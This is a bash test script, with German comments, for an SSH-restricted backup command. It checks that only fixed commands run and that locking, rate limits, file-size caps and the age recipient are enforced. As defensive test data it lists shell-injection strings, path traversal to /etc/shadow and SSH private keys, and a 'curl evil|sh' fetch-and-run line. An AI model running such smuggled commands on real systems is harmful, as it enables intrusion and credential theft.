#!/usr/bin/env bash
# Missbrauchstest fuer deploy/sicherung/sicherung-befehl.sh (siehe dessen
# Kopf): der Sicherungsschluessel darf auf C1 nur die festen Befehle
# ausfuehren. Jede andere Anfrage -- Shell-Code, angehaengte Argumente,
# fremde Pfade -- wird abgewiesen, ohne dass etwas laeuft. Der age-Empfaenger
# kommt nur von C1, nie vom Aufrufer.
#
# Der Befehl laeuft hier gegen ein Wegwerf-Verzeichnis: seine festen Pfade
# werden in einer Kopie ersetzt, die Sicherungsskripte sind Attrappen, die
# nur protokollieren, dass und wie sie liefen.
set -uo pipefail
cd "$(dirname "$0")/.."
T="$(mktemp -d)"
trap 'rm -rf "$T"' EXIT
fehler=0

mkdir -p "$T/lib" "$T/etc" "$T/stand" "$T/root/bio-sicherung"
B="$T/befehl.sh"
sed -e "s#^LIB=.*#LIB=$T/lib#" -e "s#^ETC=.*#ETC=$T/etc#" -e "s#^STAND=.*#STAND=$T/stand#" \
    -e "s#/root/#$T/root/#g" deploy/sicherung/sicherung-befehl.sh > "$B"
chmod +x "$B"
grep -q "^LIB=$T/lib$" "$B" && grep -q "^STAND=$T/stand$" "$B" && ! grep -v '^\s*#' "$B" | grep -q '/usr/local\|/etc/aequitas\|/var/lib' \
  || { echo "FEHLER: Pfade in der Testkopie nicht ersetzt"; exit 1; }

# Attrappen: schreiben auf, mit welcher Umgebung sie liefen.
cat > "$T/lib/backup-ledger.sh" <<EOF
echo "ledger BOX=\$BOX" >> "$T/lauf.log"
if IFS= read -r -t 1 zeile; then echo "stdin=\$zeile" >> "$T/lauf.log"; fi
EOF
cat > "$T/lib/backup-biometrie.sh" <<EOF
echo "bio R=\$BIO_BACKUP_AGE_RECIPIENT" >> "$T/lauf.log"
EOF

lauf() { env -i PATH="$PATH" SSH_ORIGINAL_COMMAND="$1" "$B"; }
erwarte() { # Name, erwarteter Code, Befehl
  local rc=0
  lauf "$3" >/dev/null 2>&1 || rc=$?
  [ "$rc" = "$2" ] || { echo "FEHLER: $1: Code $rc statt $2"; fehler=1; }
}
neu() { rm -f "$T/stand/"*.zuletzt "$T/lauf.log"; }

# 1. Alles ausser den festen Befehlen: abgewiesen (2), nichts laeuft.
neu
for boese in '' 'id' 'bash' 'sh -c id' 'ledger; id' 'ledger && id' 'ledger|id' $'ledger\nid' \
    'ledger $(id)' 'ledger `id`' 'ledger ' ' ledger' 'LEDGER' 'ledger-datei /etc/shadow' \
    'ledger-datei ../../etc/shadow' 'bio age1aaaa' 'bio-datei /root/.ssh/id_ed25519' \
    'scp -f /root/backup-latest.dump' 'rsync --server' 'pruefsummen; id' 'internal-sftp'; do
  erwarte "abweisen $(printf '%q' "$boese")" 2 "$boese"
done
[ ! -e "$T/lauf.log" ] || { echo "FEHLER: ein abgewiesener Befehl hat ein Sicherungsskript gestartet"; fehler=1; }

# 2. ledger laeuft mit BOX=c1 -- und liest nichts, was der Aufrufer schickt.
neu
rc=0; printf 'curl evil|sh\n' | env -i PATH="$PATH" SSH_ORIGINAL_COMMAND=ledger "$B" >/dev/null 2>&1 || rc=$?
[ "$rc" = 0 ] || { echo "FEHLER: ledger: Code $rc statt 0"; fehler=1; }
grep -qx 'ledger BOX=c1' "$T/lauf.log" 2>/dev/null || { echo "FEHLER: ledger lief nicht mit BOX=c1"; fehler=1; }
! grep -q '^stdin=' "$T/lauf.log" 2>/dev/null || { echo "FEHLER: das Sicherungsskript las die Eingabe des Aufrufers"; fehler=1; }

# 3. Wiederholung binnen 30 Minuten: abgewiesen (4), auch nach Fehlschlag.
erwarte "ledger zweimal" 4 ledger
[ "$(grep -c ledger "$T/lauf.log")" = 1 ] || { echo "FEHLER: zweiter ledger-Lauf binnen 30 min gestartet"; fehler=1; }

# 4. Gleichzeitiger Lauf: abgewiesen (3), auch das Abholen.
neu
exec 8>"$T/stand/ledger.lock"; flock -n 8
erwarte "ledger waehrend eines Laufs" 3 ledger
printf 'PGDMP...' > "$T/root/backup-latest.dump"
erwarte "ledger-datei waehrend eines Laufs" 3 ledger-datei
exec 8>&-
[ ! -e "$T/lauf.log" ] || { echo "FEHLER: Lauf trotz Sperre"; fehler=1; }

# 5. Abholen: genau die feste Datei.
[ "$(lauf ledger-datei)" = 'PGDMP...' ] || { echo "FEHLER: ledger-datei liefert nicht die feste Datei"; fehler=1; }
rm -f "$T/root/backup-latest.dump"
erwarte "ledger-datei ohne Datei" 1 ledger-datei
# Groesser als 500 MB: nicht ausgegeben (Datei ohne Platz anlegen).
truncate -s $((500 * 1024 * 1024 + 1)) "$T/root/backup-latest.dump"
[ "$(lauf ledger-datei 2>/dev/null | head -c 1 | wc -c)" = 0 ] || { echo "FEHLER: Datei ueber 500 MB ausgegeben"; fehler=1; }
rm -f "$T/root/backup-latest.dump"

# 6. bio ohne, mit falschem und mit privatem Empfaenger auf C1: nichts laeuft (5).
neu
erwarte "bio ohne Empfaenger" 5 bio
printf 'age1zzz\n' > "$T/etc/bio-empfaenger";                          erwarte "bio mit kurzem Empfaenger" 5 bio
printf 'AGE-SECRET-KEY-1QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\n' > "$T/etc/bio-empfaenger"
erwarte "bio mit privatem Schluessel" 5 bio
printf 'age1%s\n' "$(printf 'b%.0s' $(seq 58))" > "$T/etc/bio-empfaenger"; erwarte "bio mit Nicht-Bech32" 5 bio
[ ! -e "$T/lauf.log" ] || { echo "FEHLER: bio lief ohne gueltigen Empfaenger"; fehler=1; }
[ "$(lauf pruefsummen 2>/dev/null | tail -1)" = "bio_empfaenger=fehlt" ] || { echo "FEHLER: pruefsummen meldet ungueltigen Empfaenger nicht"; fehler=1; }

# 7. bio mit gueltigem Empfaenger: genau der von C1, nicht einer aus der Anfrage
# oder der Umgebung des Aufrufers.
R="age1$(printf 'q%.0s' $(seq 58))"
printf '%s\n' "$R" > "$T/etc/bio-empfaenger"
rc=0; env -i PATH="$PATH" SSH_ORIGINAL_COMMAND=bio BIO_BACKUP_AGE_RECIPIENT="age1$(printf 'p%.0s' $(seq 58))" "$B" >/dev/null 2>&1 || rc=$?
[ "$rc" = 0 ] || { echo "FEHLER: bio mit gueltigem Empfaenger: Code $rc"; fehler=1; }
grep -qx "bio R=$R" "$T/lauf.log" 2>/dev/null || { echo "FEHLER: bio nutzte nicht den Empfaenger von C1"; fehler=1; }
[ "$(lauf pruefsummen 2>/dev/null | tail -1)" = "bio_empfaenger=gesetzt" ] || { echo "FEHLER: pruefsummen erkennt gueltigen Empfaenger nicht"; fehler=1; }
erwarte "bio zweimal" 4 bio

# 8. Ein Fehlschlag des Skripts kommt beim Aufrufer an.
neu
echo 'exit 7' > "$T/lib/backup-ledger.sh"
erwarte "ledger scheitert" 7 ledger

# 9. pruefsummen nennt beide Skripte.
[ "$(lauf pruefsummen 2>/dev/null | grep -cE '^[0-9a-f]{64}  backup-(ledger|biometrie)\.sh$')" = 2 ] \
  || { echo "FEHLER: pruefsummen nennt nicht beide Skripte"; fehler=1; }

if [ "$fehler" = 0 ]; then echo "sicherung-befehl: alle Faelle bestanden"; fi
exit "$fehler"
